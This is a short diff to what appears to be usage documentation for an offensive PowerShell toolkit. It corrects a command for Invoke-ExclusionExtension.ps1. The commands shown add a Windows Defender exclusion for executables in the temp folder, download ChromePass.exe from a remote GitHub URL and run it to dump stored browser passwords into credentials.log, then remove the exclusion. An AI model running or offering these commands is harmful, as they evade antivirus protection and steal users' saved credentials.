@@ -67,6 +67,6 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Bypass
 Get-help .\Invoke-ExclusionExtension.ps1 -Force
 
 .\Invoke-ExclusionExtension.ps1 -action "add" -Extension "exe" -Directory "$Env:TMP"
-.\Invoke-ExclusionExtension.ps1 -action "exe" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Extension "exe" -Arguments "/stext credentials.log"
+.\Invoke-ExclusionExtension.ps1 -action "exec" -Extension "exe" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
 .\Invoke-ExclusionExtension.ps1 -action "del" -Extension "exe"
 ```
